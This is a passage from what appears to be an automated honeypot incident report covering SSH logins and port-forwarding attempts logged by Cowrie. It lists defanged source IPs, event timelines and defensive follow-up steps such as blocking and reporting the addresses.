| `2026-07-21 17:10:15` | `cowrie.client.kex` |
| `2026-07-21 17:10:18` | `cowrie.login.success` |
| `2026-07-21 17:10:19` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:10:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.140.95[.]250` to AbuseIPDB if not already reported
- [ ] Block `113.140.95[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cd08d51a4c0

| Field | Detail |
|---|---|
| **Source IP** | `201.28.237[.]90` |
| **First Seen** | 2026-07-21 17:12 |
| **Last Seen** | 2026-07-21 17:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:12:53` | `cowrie.session.connect` |
| `2026-07-21 17:12:54` | `cowrie.client.version` |
| `2026-07-21 17:12:54` | `cowrie.client.kex` |
| `2026-07-21 17:12:55` | `cowrie.login.success` |
| `2026-07-21 17:12:56` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:13:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.28.237[.]90` to AbuseIPDB if not already reported
- [ ] Block `201.28.237[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c47a7aa1f28

| Field | Detail |
|---|---|
| **Source IP** | `218.21.241[.]50` |
| **First Seen** | 2026-07-21 17:13 |
| **Last Seen** | 2026-07-21 17:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:13:01` | `cowrie.session.connect` |
| `2026-07-21 17:13:02` | `cowrie.client.version` |
| `2026-07-21 17:13:02` | `cowrie.client.kex` |
| `2026-07-21 17:13:04` | `cowrie.login.success` |
| `2026-07-21 17:13:05` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:13:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.21.241[.]50` to AbuseIPDB if not already reported
- [ ] Block `218.21.241[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bc56b70f82f

| Field | Detail |
|---|---|
| **Source IP** | `121.128.84[.]224` |
| **First Seen** | 2026-07-21 17:13 |
| **Last Seen** | 2026-07-21 17:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:13:33` | `cowrie.session.connect` |
| `2026-07-21 17:13:34` | `cowrie.client.version` |
| `2026-07-21 17:13:34` | `cowrie.client.kex` |
| `2026-07-21 17:13:36` | `cowrie.login.success` |
| `2026-07-21 17:13:36` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:13:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.128.84[.]224` to AbuseIPDB if not already reported
- [ ] Block `121.128.84[.]224` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7eb3fbed6957

| Field | Detail |
|---|---|
| **Source IP** | `203.123.219[.]137` |
| **First Seen** | 2026-07-21 17:15 |
| **Last Seen** | 2026-07-21 17:15 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:15:43` | `cowrie.session.connect` |
| `2026-07-21 17:15:44` | `cowrie.client.version` |
| `2026-07-21 17:15:44` | `cowrie.client.kex` |
| `2026-07-21 17:15:47` | `cowrie.login.success` |
| `2026-07-21 17:15:47` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:15:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.123.219[.]137` to AbuseIPDB if not already reported
- [ ] Block `203.123.219[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1e85f7cbdf2

| Field | Detail |
|---|---|
| **Source IP** | `203.192.247[.]84` |
| **First Seen** | 2026-07-21 17:15 |
| **Last Seen** | 2026-07-21 17:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:15:57` | `cowrie.session.connect` |
| `2026-07-21 17:15:58` | `cowrie.client.version` |
| `2026-07-21 17:15:58` | `cowrie.client.kex` |
| `2026-07-21 17:16:00` | `cowrie.login.success` |
| `2026-07-21 17:16:01` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:16:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.192.247[.]84` to AbuseIPDB if not already reported
- [ ] Block `203.192.247[.]84` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f708827be15

| Field | Detail |
|---|---|
| **Source IP** | `180.188.253[.]150` |
| **First Seen** | 2026-07-21 17:18 |
| **Last Seen** | 2026-07-21 17:18 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:18:41` | `cowrie.session.connect` |
| `2026-07-21 17:18:42` | `cowrie.client.version` |
| `2026-07-21 17:18:42` | `cowrie.client.kex` |
| `2026-07-21 17:18:45` | `cowrie.login.success` |
| `2026-07-21 17:18:45` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:18:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.188.253[.]150` to AbuseIPDB if not already reported
- [ ] Block `180.188.253[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8dd08945d50

| Field | Detail |
|---|---|
| **Source IP** | `27.79.4[.]201` |
| **First Seen** | 2026-07-21 17:19 |
| **Last Seen** | 2026-07-21 17:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:19:27` | `cowrie.session.connect` |
| `2026-07-21 17:19:27` | `cowrie.client.version` |
| `2026-07-21 17:19:28` | `cowrie.client.kex` |
| `2026-07-21 17:19:31` | `cowrie.login.success` |
| `2026-07-21 17:19:31` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:19:32` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-21 17:19:32` | `cowrie.direct-tcpip.data` |
| `2026-07-21 17:19:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.4[.]201` to AbuseIPDB if not already reported
- [ ] Block `27.79.4[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-824963a813d1

| Field | Detail |
|---|---|
| **Source IP** | `171.243.150[.]251` |
| **First Seen** | 2026-07-21 17:20 |
| **Last Seen** | 2026-07-21 17:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:20:48` | `cowrie.session.connect` |
| `2026-07-21 17:20:48` | `cowrie.client.version` |
| `2026-07-21 17:20:48` | `cowrie.client.kex` |
| `2026-07-21 17:20:50` | `cowrie.login.success` |
| `2026-07-21 17:20:50` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:20:51` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-21 17:20:51` | `cowrie.direct-tcpip.data` |
| `2026-07-21 17:20:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.150[.]251` to AbuseIPDB if not already reported
- [ ] Block `171.243.150[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d95c569c9ac1

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-21 17:21 |
| **Last Seen** | 2026-07-21 17:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:21:42` | `cowrie.session.connect` |
| `2026-07-21 17:21:42` | `cowrie.client.version` |
| `2026-07-21 17:21:42` | `cowrie.client.kex` |
| `2026-07-21 17:21:42` | `cowrie.login.success` |
| `2026-07-21 17:21:43` | `cowrie.session.params` |
| `2026-07-21 17:21:43` | `cowrie.command.input` |
| `2026-07-21 17:21:43` | `cowrie.log.closed` |
| `2026-07-21 17:21:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b1571a39e1a

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]131` |
| **First Seen** | 2026-07-21 17:21 |
| **Last Seen** | 2026-07-21 17:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:21:59` | `cowrie.session.connect` |
| `2026-07-21 17:22:00` | `cowrie.client.version` |
| `2026-07-21 17:22:00` | `cowrie.client.kex` |
| `2026-07-21 17:22:02` | `cowrie.login.success` |
| `2026-07-21 17:22:02` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:22:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]131` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]131` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-228cf43f76fb

| Field | Detail |
|---|---|
| **Source IP** | `27.79.4[.]201` |
| **First Seen** | 2026-07-21 17:23 |
| **Last Seen** | 2026-07-21 17:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:23:29` | `cowrie.session.connect` |
| `2026-07-21 17:23:29` | `cowrie.client.version` |
| `2026-07-21 17:23:29` | `cowrie.client.kex` |
| `2026-07-21 17:23:32` | `cowrie.login.success` |
| `2026-07-21 17:23:32` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:23:33` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-21 17:23:33` | `cowrie.direct-tcpip.data` |
| `2026-07-21 17:23:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.4[.]201` to AbuseIPDB if not already reported
- [ ] Block `27.79.4[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8b0032b46e0

| Field | Detail |
|---|---|
| **Source IP** | `27.79.4[.]201` |
| **First Seen** | 2026-07-21 17:25 |
| **Last Seen** | 2026-07-21 17:25 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:25:13` | `cowrie.session.connect` |
| `2026-07-21 17:25:13` | `cowrie.client.version` |
| `2026-07-21 17:25:19` | `cowrie.client.kex` |
| `2026-07-21 17:25:22` | `cowrie.login.success` |
| `2026-07-21 17:25:22` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:25:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-21 17:25:23` | `cowrie.direct-tcpip.data` |
| `2026-07-21 17:25:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.4[.]201` to AbuseIPDB if not already reported
- [ ] Block `27.79.4[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4071a6f72b61

| Field | Detail |
|---|---|
| **Source IP** | `62.122.195[.]14` |
| **First Seen** | 2026-07-21 17:25 |
| **Last Seen** | 2026-07-21 17:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:25:28` | `cowrie.session.connect` |
| `2026-07-21 17:25:28` | `cowrie.client.version` |
| `2026-07-21 17:25:28` | `cowrie.client.kex` |
| `2026-07-21 17:25:29` | `cowrie.login.success` |
| `2026-07-21 17:25:29` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:25:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.122.195[.]14` to AbuseIPDB if not already reported
- [ ] Block `62.122.195[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d7991c1a79c

| Field | Detail |
|---|---|
| **Source IP** | `171.243.150[.]251` |
| **First Seen** | 2026-07-21 17:27 |
| **Last Seen** | 2026-07-21 17:27 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:27:30` | `cowrie.session.connect` |
| `2026-07-21 17:27:30` | `cowrie.client.version` |
| `2026-07-21 17:27:43` | `cowrie.client.kex` |
| `2026-07-21 17:27:45` | `cowrie.login.success` |
| `2026-07-21 17:27:46` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:27:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-21 17:27:47` | `cowrie.direct-tcpip.data` |
| `2026-07-21 17:27:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.150[.]251` to AbuseIPDB if not already reported
- [ ] Block `171.243.150[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24ca50f4f0c5

| Field | Detail |
|---|---|
| **Source IP** | `171.243.150[.]251` |
| **First Seen** | 2026-07-21 17:28 |
| **Last Seen** | 2026-07-21 17:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:28:57` | `cowrie.session.connect` |
| `2026-07-21 17:28:57` | `cowrie.client.version` |
| `2026-07-21 17:28:58` | `cowrie.client.kex` |
| `2026-07-21 17:28:59` | `cowrie.login.success` |
| `2026-07-21 17:28:59` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:29:01` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-21 17:29:01` | `cowrie.direct-tcpip.data` |
| `2026-07-21 17:29:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.150[.]251` to AbuseIPDB if not already reported
- [ ] Block `171.243.150[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c303705443e4

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-21 17:29 |
| **Last Seen** | 2026-07-21 17:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:29:04` | `cowrie.session.connect` |
| `2026-07-21 17:29:04` | `cowrie.client.version` |
| `2026-07-21 17:29:04` | `cowrie.client.kex` |
| `2026-07-21 17:29:04` | `cowrie.login.success` |
| `2026-07-21 17:29:05` | `cowrie.session.params` |
| `2026-07-21 17:29:05` | `cowrie.command.input` |
| `2026-07-21 17:29:05` | `cowrie.log.closed` |
| `2026-07-21 17:29:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f49f747a7f1b

| Field | Detail |
|---|---|
| **Source IP** | `223.82.97[.]51` |
| **First Seen** | 2026-07-21 17:35 |
| **Last Seen** | 2026-07-21 17:35 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:35:07` | `cowrie.session.connect` |
| `2026-07-21 17:35:08` | `cowrie.client.version` |
| `2026-07-21 17:35:08` | `cowrie.client.kex` |
| `2026-07-21 17:35:10` | `cowrie.login.success` |
| `2026-07-21 17:35:11` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:35:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.82.97[.]51` to AbuseIPDB if not already reported
- [ ] Block `223.82.97[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d098c9c612e9

| Field | Detail |
|---|---|
| **Source IP** | `171.243.150[.]251` |
| **First Seen** | 2026-07-21 17:35 |
| **Last Seen** | 2026-07-21 17:35 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:35:15` | `cowrie.session.connect` |
| `2026-07-21 17:35:15` | `cowrie.client.version` |
| `2026-07-21 17:35:16` | `cowrie.client.kex` |
| `2026-07-21 17:35:18` | `cowrie.login.success` |
| `2026-07-21 17:35:19` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:35:20` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-21 17:35:20` | `cowrie.direct-tcpip.data` |
| `2026-07-21 17:35:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.150[.]251` to AbuseIPDB if not already reported
- [ ] Block `171.243.150[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b92575720afc

| Field | Detail |
|---|---|
| **Source IP** | `210.245.95[.]11` |
| **First Seen** | 2026-07-21 17:35 |
| **Last Seen** | 2026-07-21 17:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:35:16` | `cowrie.session.connect` |
| `2026-07-21 17:35:17` | `cowrie.client.version` |
| `2026-07-21 17:35:17` | `cowrie.client.kex` |
| `2026-07-21 17:35:19` | `cowrie.login.success` |
| `2026-07-21 17:35:19` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:35:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.245.95[.]11` to AbuseIPDB if not already reported
- [ ] Block `210.245.95[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3243be1b24c

| Field | Detail |
|---|---|
| **Source IP** | `171.243.148[.]53` |
| **First Seen** | 2026-07-21 17:35 |
| **Last Seen** | 2026-07-21 17:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:35:53` | `cowrie.session.connect` |
| `2026-07-21 17:35:53` | `cowrie.client.version` |
| `2026-07-21 17:35:53` | `cowrie.client.kex` |
| `2026-07-21 17:35:56` | `cowrie.login.success` |
| `2026-07-21 17:35:56` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:35:57` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-21 17:35:57` | `cowrie.direct-tcpip.data` |
| `2026-07-21 17:35:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.148[.]53` to AbuseIPDB if not already reported
- [ ] Block `171.243.148[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b4f79d42d4e

| Field | Detail |
|---|---|
| **Source IP** | `60.214.127[.]246` |
| **First Seen** | 2026-07-21 17:37 |
| **Last Seen** | 2026-07-21 17:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:37:39` | `cowrie.session.connect` |
| `2026-07-21 17:37:39` | `cowrie.client.version` |
| `2026-07-21 17:37:39` | `cowrie.client.kex` |
| `2026-07-21 17:37:41` | `cowrie.login.success` |
| `2026-07-21 17:37:42` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:37:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.214.127[.]246` to AbuseIPDB if not already reported
- [ ] Block `60.214.127[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1790e9d79089

| Field | Detail |
|---|---|
| **Source IP** | `101.13.5[.]26` |
| **First Seen** | 2026-07-21 17:37 |
| **Last Seen** | 2026-07-21 17:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:37:47` | `cowrie.session.connect` |
| `2026-07-21 17:37:48` | `cowrie.client.version` |
| `2026-07-21 17:37:48` | `cowrie.client.kex` |
| `2026-07-21 17:37:50` | `cowrie.login.success` |
| `2026-07-21 17:37:51` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:37:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.5[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.13.5[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36a60fd24cf6

| Field | Detail |
|---|---|
| **Source IP** | `82.65.140[.]218` |
| **First Seen** | 2026-07-21 17:38 |
| **Last Seen** | 2026-07-21 17:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:38:44` | `cowrie.session.connect` |
| `2026-07-21 17:38:44` | `cowrie.client.version` |
| `2026-07-21 17:38:44` | `cowrie.client.kex` |
| `2026-07-21 17:38:46` | `cowrie.login.success` |
| `2026-07-21 17:38:46` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:38:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.65.140[.]218` to AbuseIPDB if not already reported
- [ ] Block `82.65.140[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8440a80a0e5

| Field | Detail |
|---|---|
| **Source IP** | `180.76.104[.]208` |
| **First Seen** | 2026-07-21 17:38 |
| **Last Seen** | 2026-07-21 17:39 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 17:38:51` | `cowrie.session.connect` |
| `2026-07-21 17:38:53` | `cowrie.client.version` |
| `2026-07-21 17:38:53` | `cowrie.client.kex` |
| `2026-07-21 17:38:56` | `cowrie.login.success` |
| `2026-07-21 17:38:56` | `cowrie.direct-tcpip.request` |
| `2026-07-21 17:39:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.104[.]208` to AbuseIPDB if not already reported
- [ ] Block `180.76.104[.]208` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d491e13c3fa

| Field | Detail |
|---|---|
